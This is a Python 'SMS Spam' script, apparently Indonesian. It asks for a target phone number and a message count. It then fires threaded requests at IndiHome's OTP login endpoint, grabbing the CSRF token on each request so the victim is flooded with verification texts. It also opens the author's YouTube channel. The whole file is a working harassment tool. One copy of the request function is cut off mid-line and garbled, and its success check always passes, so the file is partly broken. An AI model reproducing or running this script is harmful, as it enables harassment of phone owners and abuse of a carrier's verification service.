from requests import ConnectionError
from time import sleep
import requests, sys, os, re, random
from concurrent.futures import ThreadPoolExecutor

M = '\033[1;31m'
H = '\033[1;32m'
K = '\033[1;33m'
U = '\033[1;34m'
P = '\033[1;35m'
C = '\033[1;36m'
W = '\033[1;37m'
A = '\033[90m'


os.system('clear')
print(C+'Subscribe channel Ryuzora')
sleep(2)
print(K+'[ Opening'+M+' Youtube ]')
sleep(1)
os.system('xdg-open https://www.youtube.com/c/RyuzsanYT')
os.system('clear')
sleep(1.3)

def gas(no):
        s = requests.Session()
        url = "https://www.indihome.co.id/verifik>
        req = s.get(url).text
        token = re.findall(r"name=\"_token\" valu>

        data = {
        "_token":token,
        "msisdn":no
        }

        spam = s.post(url, data=data).text

        return spam

def gas(no):
        s = requests.Session()
        url = "https://www.indihome.co.id/verifikasi-layanan/login-otp"
        req = s.get(url).text
        token = re.findall(r"name=\"_token\" value=\"(.*?)\"", req)[0]

        data = {
        "_token":token,
        "msisdn":no
        }

        spam = s.post(url, data=data).text

        return spam
        
def main(cnt, no):
        jml = 0
        with ThreadPoolExecutor(max_workers=2) as e:
                futures = []
                for x in range(int(cnt)):
                        futures.append(e.submit(gas, no))
                for i, future in enumerate(futures):
                        jml += 1
                        spam = future.result()
                        if "Gagal!" or "dikirim" in spam:
                                print(f"[{jml}] \033[1;33mSpam telah terkirim ke {no}")
                        else:
                                print("* ERROR *")
                                sys.exit()
                                
                                
print("")

if __name__ == '__main__':
        try:
                helloi = input(K+'Tap enter to continue')
                print("""\033[1m
\033[1;95m╔═════════════════════════╗
\033[1;95m║         Script          ║
\033[1;95m║       SMS    Spam       ║
\033[1;95m║         Ryuzora         ║
\033[1;95m╚═════════════════════════╝
        """)

                no = input("\033[1;34mMasukan nomor target (pakai 08)    : ")
                if(no.isdigit()):
                        pass
                else:
                        print("Nomor telepon invalid!")
                        sys.exit()

                if len(no) < 9:
                        print("Nomor telepon kurang dari 9 digit!")
                        sys.exit()
                        
                cnt = input("Jumlah pesan? : ")
                if bool(cnt.isdigit()) == 0:
                        print("Jumlah pesan tidak boleh nol")
                        sys.exit()
                else:
                        print("")
                        main(cnt, no)
        except(KeyboardInterrupt, EOFError):
                print("\n")
                sys.exit()
